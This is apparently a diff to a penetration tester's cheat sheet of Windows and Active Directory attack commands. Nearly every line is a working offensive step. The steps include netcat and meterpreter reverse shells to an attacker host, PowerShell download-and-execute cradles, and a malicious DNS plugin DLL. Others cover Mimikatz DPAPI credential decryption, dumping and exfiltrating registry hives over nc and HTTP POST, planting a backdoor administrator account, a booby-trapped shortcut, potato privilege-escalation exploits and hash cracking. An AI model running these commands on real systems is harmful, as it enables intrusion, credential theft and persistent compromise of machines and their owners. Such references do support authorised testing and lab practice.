@@ -1751,13 +1751,6 @@ curl $MYIP/windows/nc.exe -o \programdata\nc.exe
 \programdata\nc.exe $MYIP 80 < \programdata\BloodHound.zip
 rlwrap nc -lvp 80 > /Upload/bloodhound/files.zip
 
-+---------- Ping Sweep /24 ----------+
-//$MYIP/$/ping.bat 192.168.210.X
-
-+---------- Pre Windows 2000 ----------+
-cat computers | cut -d '$' -f1 > PRE2k
-nxc smb 192.168.110.51-56 -u computers -p PRE2k --no-bruteforce
-
 +---------- Dump Hashes ----------+
 powershell -c "net user dbf 123qweasdF! /add ; net localgroup Administrators dbf /add"
 nxc smb $TARGET -u 'dbf' -p '123qweasdF!' --local-auth --sam --lsa --dpapi
@@ -1776,11 +1769,15 @@ IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:53/Invoke-RunasCs.ps
 +---------- Restore AD Objects ----------+
 powershell -c "Restore-ADObject -Identity 'GUID or DistinguishedName'"
 
-+---------- DPAPI ----------+
-curl $MYIP/windows/mimikatz.exe -o \programdata\mimikatz.exe; \programdata\mimikatz.exe
-dpapi::masterkey /in:"...\<USER>\...\...\Microsoft\Protect\<USER_SID>\<CRED_FILE>" /sid:<USER_SID> /rpc
-dpapi::masterkey /in:"...\<USER>\...\...\Microsoft\Protect\<USER_SID>\<CRED_FILE>" /sid:<USER_SID> /password:$PASSWORD /protected
-dpapi::cred /masterkey:<MASTER_KEY> /in:"...\<USER>\...\...\Microsoft\Credentials\<ENCRYPTED_FILE>"
++---------- CanPSRemote (AdminTo) ----------+
+Invoke-Command -ComputerName SRV01 -ScriptBlock { whoami /priv }
+Invoke-Command -ComputerName SRV01 -ScriptBlock { arp /a }
+Invoke-Command -ComputerName SRV01 -ScriptBlock { ipconfig /all }
+Invoke-Command -ComputerName SRV01 -ScriptBlock { net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add }
+Invoke-Command -ComputerName SRV01 -ScriptBlock { reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }
+impacket-secretsdump 'dbf':'123qweasdF!'@$TARGET
+Invoke-Command -ComputerName SRV01 -ScriptBlock { New-Item -Path "C:\Tools" -ItemType Directory }
+Invoke-Command -ComputerName SRV01 -ScriptBlock { New-SmbShare -Name Tools -Path C:\Tools -FullAccess dbf }
 
 +---------- SeBackupPrivilege ----------+
 $a = [System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://$MYIP:53/windows/SeBackupPrivilegeUtils.dll')); Get-ChildItem C:\Users -Recurse -File -Include user.txt,root.txt | ForEach-Object {$d=Join-Path $env:TEMP "$([guid]::NewGuid()).txt"; [bz.OneOEight.SeBackupPrivilege.SeBackupPrivilegeUtils]::CopyFile($_.FullName,$d,[ref]$true,$true)>$null; Get-Content $d; Remove-Item $d -Force}
@@ -1814,6 +1811,12 @@ impacket-smbserver $ /Upload/windows
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=80 -f dll -o /Upload/windows/x.dll
 dnscmd.exe /config /serverlevelplugindll \\$MYIP\$\x.dll
 
++---------- DPAPI ----------+
+curl $MYIP/windows/mimikatz.exe -o \programdata\mimikatz.exe; \programdata\mimikatz.exe
+dpapi::masterkey /in:"...\<USER>\...\...\Microsoft\Protect\<USER_SID>\<CRED_FILE>" /sid:<USER_SID> /rpc
+dpapi::masterkey /in:"...\<USER>\...\...\Microsoft\Protect\<USER_SID>\<CRED_FILE>" /sid:<USER_SID> /password:$PASSWORD /protected
+dpapi::cred /masterkey:<MASTER_KEY> /in:"...\<USER>\...\...\Microsoft\Credentials\<ENCRYPTED_FILE>"
+
 +---------- Malicious .lnk ----------+
 curl $MYIP/windows/nc.exe -o \programdata\nc.exe
 powershell -c "$s = New-Object -ComObject WScript.Shell; $sc = $s.CreateShortcut('C:\Common Applications\Notepad.lnk'); $sc.TargetPath = 'C:\programdata\nc.exe'; $sc.Arguments = '$TARGET 5566 -e cmd.exe'; $sc.Save()"
@@ -1825,74 +1828,13 @@ certutil -user
 certutil -CATemplates -config mist-DC01-CA
 certutil -Template User
 
-+---------- Shell From File ----------+
-msfvenom -p windows/x64/exec CMD='powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQBy<SNIP>_WEB_DELIVERY' EXITFUNC=none -f dll > x.dll
-msfvenom -p windows/x64/exec CMD='powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQBy<SNIP>_WEB_DELIVERY' EXITFUNC=none -f exe > x.exe
-rlwrap nc -lvnp 80
-powershell -c "\programdata\bat2exe.bat $MYIP 80; \programdata\x.exe"
-
-+---------- Transfer Files from Windows ----------+
-[Convert]::ToBase64String([IO.File]::ReadAllBytes((Get-Location).Path + "\file"))
-echo '' | base64 -d > file
-
 +---------- File Permissions ----------+
 powershell -c "(Get-Acl 'C:\secret.txt').Access | Format-Table"
 takeown /f "C:\secret.txt" && icacls "C:\secret.txt" /grant %USERNAME%:F /inheritance:e
 
-+---------- Unquoted Paths ----------+
-powershell -c "wmic service get name,displayname,pathname,startmode |findstr /i 'auto' |findstr /i /v 'c:\windows'"
-
 +---------- Scheduled Tasks ----------+
 powershell -c "$task = Get-ScheduledTask -TaskName 'Ownership'; $task.Actions; $task.Triggers; $task.Settings; $task | Format-List *"
 powershell -c "Start-ScheduledTask -TaskName 'Ownership'"
-
-+---------- Shell From Memory ----------+
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=80 -f psh -o 0.ps1
-rlwrap msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $MYIP; set LPORT 80; run"
-powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:53/windows/0.ps1')"
-
-+---------- Other Exploits ----------+
-powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:53/windows/Invoke-SigmaPotato.ps1');Invoke-SigmaPotato -Command \"whoami /user /priv\""
-C:\programdata\FullPowers.exe -c "C:\programdata\EfsPotato.exe \"C:\programdata\nc.exe $MYIP 80 -e cmd\"" -z
-C:\programdata\jp32.exe -l 1337 -p "cmd.exe" -a "/c \programdata\nc.exe $MYIP 5678 -e cmd"  -t * -c {3c6859ce-230b-48a4-be6c-932c0c202048}
-https://ohpe.it/juicy-potato/CLSID/
-Windows Server 2008     {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstaller
-Windows Server 2012     {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstaller
-Windows Server 2016     {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstaller
-Windows 7               {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstaller
-Windows 8.1             {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstaller
-Windows 10 Enterprise   {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstaller
-Windows 10 Pro          {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstaller
-
-+---------- Dump Hashes (Local) ----------+
-cd c:\programdata; reg save hklm\sam sam; reg save hklm\security security; reg save hklm\system system
-iwr http://$MYIP:4444 -Method POST -InFile ".\sam"
-cmd /c "nc.exe $MYIP 4444 -w 3 < sam"
-nc -lvp 4444 > sam
-iwr http://$MYIP:4444 -Method POST -InFile ".\security"
-cmd /c "nc.exe $MYIP 4444 -w 3 < security"
-nc -lvp 4444 > security
-iwr http://$MYIP:4444 -Method POST -InFile ".\system"
-cmd /c "nc.exe $MYIP 4444 -w 3 < system"
-nc -lvp 4444 > system
-impacket-secretsdump -sam sam -system system -security security LOCAL
-echo 'Administrator:500:...................' > hashes
-cp hashes /mnt/c/hashcat
-cd /mnt/c/hashcat; hashcat.exe -m 1000 -a 0 hashes $(wslpath -w $rockyou)
-powershell -c "(Get-WmiObject Win32_ComputerSystem).Domain"
-impacket-secretsdump $DOM/'$USERNAME':'$PASSWORD'@$TARGET
-
-+---------- Other ----------+
-Get-WmiObject -Class Win32_ComputerSystem | Select-Object Domain
-Get-ADComputer -Filter * | Select-Object Name
-systeminfo | Select-String "Domain"
-net view
-net group "Domain Computers" /domain
-net view /domain
-net user /domain
-wmic useraccount get name,sid
-powershell -c "Set-ExecutionPolicy unrestricted"
-services.msc
 
 [*] Meterpreter
 +---------- Initial Shell ----------+
